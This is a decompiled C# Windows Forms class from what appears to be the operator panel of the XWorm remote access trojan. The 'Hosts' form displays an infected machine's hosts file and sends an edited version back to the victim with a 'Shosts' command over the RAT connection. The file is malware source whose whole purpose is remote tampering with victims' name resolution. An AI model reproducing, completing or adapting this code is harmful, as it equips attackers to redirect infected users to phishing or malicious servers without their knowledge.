using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200001B RID: 27
	[DesignerGenerated]
	public partial class Hosts : Form
	{
		// Token: 0x060005DE RID: 1502 RVA: 0x00035658 File Offset: 0x00033858
		public Hosts()
		{
			this.InitializeComponent();
		}

		// Token: 0x1700022F RID: 559
		// (get) Token: 0x060005E1 RID: 1505 RVA: 0x00035E8B File Offset: 0x0003408B
		// (set) Token: 0x060005E2 RID: 1506 RVA: 0x00035E95 File Offset: 0x00034095
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000230 RID: 560
		// (get) Token: 0x060005E3 RID: 1507 RVA: 0x00035E9E File Offset: 0x0003409E
		// (set) Token: 0x060005E4 RID: 1508 RVA: 0x00035EA8 File Offset: 0x000340A8
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000231 RID: 561
		// (get) Token: 0x060005E5 RID: 1509 RVA: 0x00035EB1 File Offset: 0x000340B1
		// (set) Token: 0x060005E6 RID: 1510 RVA: 0x00035EBC File Offset: 0x000340BC
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000232 RID: 562
		// (get) Token: 0x060005E7 RID: 1511 RVA: 0x00035EFF File Offset: 0x000340FF
		// (set) Token: 0x060005E8 RID: 1512 RVA: 0x00035F0C File Offset: 0x0003410C
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000233 RID: 563
		// (get) Token: 0x060005E9 RID: 1513 RVA: 0x00035F4F File Offset: 0x0003414F
		// (set) Token: 0x060005EA RID: 1514 RVA: 0x00035F59 File Offset: 0x00034159
		internal virtual MenuStrip MenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000234 RID: 564
		// (get) Token: 0x060005EB RID: 1515 RVA: 0x00035F62 File Offset: 0x00034162
		// (set) Token: 0x060005EC RID: 1516 RVA: 0x00035F6C File Offset: 0x0003416C
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox1_TextChanged);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000235 RID: 565
		// (get) Token: 0x060005ED RID: 1517 RVA: 0x00035FAF File Offset: 0x000341AF
		// (set) Token: 0x060005EE RID: 1518 RVA: 0x00035FB9 File Offset: 0x000341B9
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x060005EF RID: 1519 RVA: 0x00035FC4 File Offset: 0x000341C4
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060005F0 RID: 1520 RVA: 0x0003601C File Offset: 0x0003421C
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"Shosts",
				SettingsHelper.SPL,
				this.Guna2TextBox2.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox1.Text
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
			this.ToolStripMenuItem1.Enabled = false;
		}

		// Token: 0x060005F1 RID: 1521 RVA: 0x000360A1 File Offset: 0x000342A1
		private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.ToolStripMenuItem1.Enabled = true;
		}

		// Token: 0x04000263 RID: 611
		public Client C;
	}
}
